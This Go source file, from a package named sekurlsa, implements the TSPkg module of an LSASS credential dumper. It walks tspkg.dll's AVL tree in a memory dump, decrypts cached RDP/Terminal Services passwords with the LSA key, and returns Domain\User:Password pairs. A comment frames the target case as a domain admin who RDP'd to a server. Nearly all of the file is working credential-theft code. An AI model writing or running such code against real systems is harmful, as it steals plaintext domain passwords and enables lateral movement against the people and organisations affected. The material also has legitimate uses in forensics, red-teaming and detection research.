package sekurlsa

import (
	"encoding/binary"
	"fmt"
)

// TSPkgLayout captures per-build offsets inside a KIWI_TS_CREDENTIAL
// node and the inner KIWI_TS_PRIMARY_CREDENTIAL it points at. The
// inner-struct UNICODE_STRING offsets are stable across every Win 7+
// build: UserName at +0x00, Domain at +0x10, Password at +0x20. They
// are not part of this struct because operators rarely need to
// override them.
//
// Set NodeSize=0 (zero value) and the TSPkg walker is skipped — a
// template that lacks TSPkg support stays inert without runtime cost.
type TSPkgLayout struct {
	NodeSize uint32

	// LUID — locally-unique session id. Used to merge a TSPkg
	// credential into the matching MSV1_0 LogonSession by LUID.
	LUIDOffset uint32

	// PrimaryPtrOffset is the byte offset to the
	// KIWI_TS_PRIMARY_CREDENTIAL pointer inside the outer node. The
	// walker dereferences it to reach the UserName / Domain /
	// (encrypted) Password UNICODE_STRINGs.
	PrimaryPtrOffset uint32
}

// TSPkgCredential is the credential payload extracted from a single
// TSPkg session. Plaintext password is non-empty when an interactive
// RDP / Terminal Services session cached its credential — the
// classic "domain admin RDP'd to a server, we dump LSASS" scenario.
type TSPkgCredential struct {
	UserName    string
	LogonDomain string
	Password    string
	Found       bool
}

// AuthPackage satisfies the Credential interface.
func (TSPkgCredential) AuthPackage() string { return "TSPkg" }

// String renders Domain\User:Password, matching the WdigestCredential
// emit format so log lines stay homogeneous across plaintext-password
// providers.
func (c TSPkgCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	return fmt.Sprintf("%s:%s", user, c.Password)
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
// Plaintext passwords are the most-sensitive credential surface;
// wipe before discarding the Result.
func (c *TSPkgCredential) wipe() {
	c.Password = ""
	c.Found = false
}

// extractTSPkg walks tspkg.dll's KIWI_TS_CREDENTIAL AVL tree and
// decrypts every node's password. Returns one TSPkgCredential per
// LUID.
//
// Vista+ TSPkg uses an RTL_AVL_TABLE (same layout pattern as
// Kerberos) rather than a flat doubly-linked list. The signature
// lands on the address of a *pointer* to the table; we deref once
// to get the table address, walk BalancedRoot.RightChild, and at
// each AVL node read the user_data pointer at +0x20 to reach the
// actual KIWI_TS_CREDENTIAL struct.
//
// Returns (nil, nil) without warning when the template lacks TSPkg
// support (TSPkgLayout.NodeSize == 0).
func extractTSPkg(r *reader, tspkgModule Module, t *Template, lsaKey *lsaKey) (map[uint64]*TSPkgCredential, []string) {
	if t.TSPkgLayout.NodeSize == 0 || len(t.TSPkgListPattern) == 0 {
		return nil, nil
	}

	body, err := r.ReadVA(tspkgModule.BaseOfImage, int(tspkgModule.SizeOfImage))
	if err != nil {
		return nil, []string{fmt.Sprintf("TSPkg: read tspkg.dll body: %v", err)}
	}

	globalVA, err := derefRel32(
		body,
		tspkgModule.BaseOfImage,
		t.TSPkgListPattern,
		t.TSPkgListWildcards,
		t.TSPkgListOffset,
		r,
	)
	if err != nil {
		return nil, []string{fmt.Sprintf("TSPkg list head: %v", err)}
	}

	tableVA, err := readPointer(r, globalVA)
	if err != nil || tableVA == 0 {
		return nil, nil
	}

	treeRoot := readAVLTreeRoot(r, tableVA)
	if treeRoot == 0 {
		return nil, nil
	}

	creds := make(map[uint64]*TSPkgCredential)
	var warnings []string

	const maxNodes = 1024
	walkAVL(r, treeRoot, maxNodes, func(avlNode uint64) {
		// AVL node: [RTL_BALANCED_LINKS (0x20)][user_data].
		// user_data at +0x20 is a pointer to the KIWI_TS_CREDENTIAL.
		credPtr, err := readPointer(r, avlNode+avlNodeUserDataOffset)
		if err != nil || credPtr == 0 {
			return
		}
		node, err := r.ReadVA(credPtr, int(t.TSPkgLayout.NodeSize))
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("TSPkg credential @0x%X: %v", credPtr, err))
			return
		}
		cred, luid, warn := decodeTSPkgNode(r, node, t, lsaKey)
		if warn != "" {
			warnings = append(warnings, warn)
		}
		if cred.Found {
			c := cred
			creds[luid] = &c
		}
	})

	return creds, warnings
}

// decodeTSPkgNode projects a node-bytes blob through the layout
// then dereferences the inner KIWI_TS_PRIMARY_CREDENTIAL pointer to
// reach the actual UserName / Domain / Password UNICODE_STRINGs.
//
// The inner-struct layout is stable across every Win 7+ build:
//
//	+0x00  UserName UNICODE_STRING (16 bytes)
//	+0x10  Domain   UNICODE_STRING (16 bytes)
//	+0x20  Password UNICODE_STRING (16 bytes; Buffer points at cipher)
//
// so we hardcode those offsets — no Template field needed.
func decodeTSPkgNode(r *reader, node []byte, t *Template, lsaKey *lsaKey) (TSPkgCredential, uint64, string) {
	l := t.TSPkgLayout
	if uint32(len(node)) < l.NodeSize {
		return TSPkgCredential{}, 0, fmt.Sprintf("TSPkg node too small: %d < %d", len(node), l.NodeSize)
	}

	luid := binary.LittleEndian.Uint64(node[l.LUIDOffset : l.LUIDOffset+8])
	primaryPtr := binary.LittleEndian.Uint64(node[l.PrimaryPtrOffset : l.PrimaryPtrOffset+8])
	if primaryPtr == 0 {
		return TSPkgCredential{}, luid, ""
	}

	// Inner KIWI_TS_PRIMARY_CREDENTIAL is 0x30 bytes covering
	// UserName + Domain + Password.
	const innerSize = 0x30
	primary, err := r.ReadVA(primaryPtr, innerSize)
	if err != nil {
		return TSPkgCredential{}, luid, fmt.Sprintf("TSPkg primary @0x%X: %v", primaryPtr, err)
	}

	// Microsoft quirk documented by pypykatz: TSPkg's primary
	// credential struct stores the values at the swapped UNICODE_STRING
	// slots — what's at the "UserName" offset is actually the domain,
	// and vice versa. We read both then swap to publish the
	// operationally meaningful pair.
	rawA := readUnicodeString(r, primary[0x00:0x10])
	rawB := readUnicodeString(r, primary[0x10:0x20])
	domain := rawA
	username := rawB

	pwdField := primary[0x20:0x30]
	pwdLen := binary.LittleEndian.Uint16(pwdField[0:2])
	pwdBufPtr := binary.LittleEndian.Uint64(pwdField[8:16])
	if pwdLen == 0 || pwdBufPtr == 0 {
		return TSPkgCredential{}, luid, ""
	}
	ct, err := r.ReadVA(pwdBufPtr, int(pwdLen))
	if err != nil {
		return TSPkgCredential{}, luid, fmt.Sprintf("TSPkg cipher @0x%X: %v", pwdBufPtr, err)
	}
	pt, err := decryptLSA(ct, lsaKey)
	if err != nil {
		return TSPkgCredential{}, luid, fmt.Sprintf("TSPkg decrypt @0x%X: %v", pwdBufPtr, err)
	}
	password := decodeUTF16LEBytes(pt)

	cred := TSPkgCredential{
		UserName:    username,
		LogonDomain: domain,
		Password:    password,
		Found:       password != "",
	}
	return cred, luid, ""
}

// mergeTSPkg grafts TSPkg credentials onto matching LogonSessions by
// LUID, mirroring mergeWdigest / mergeDPAPI semantics. Orphan TSPkg
// LUIDs surface as new sessions so callers don't lose any extracted
// secret.
func mergeTSPkg(sessions []LogonSession, ts map[uint64]*TSPkgCredential) []LogonSession {
	return mergeByLUID(sessions, ts, func(luid uint64, c *TSPkgCredential) LogonSession {
		return LogonSession{
			LUID:        luid,
			UserName:    c.UserName,
			LogonDomain: c.LogonDomain,
			Credentials: []Credential{c},
		}
	})
}
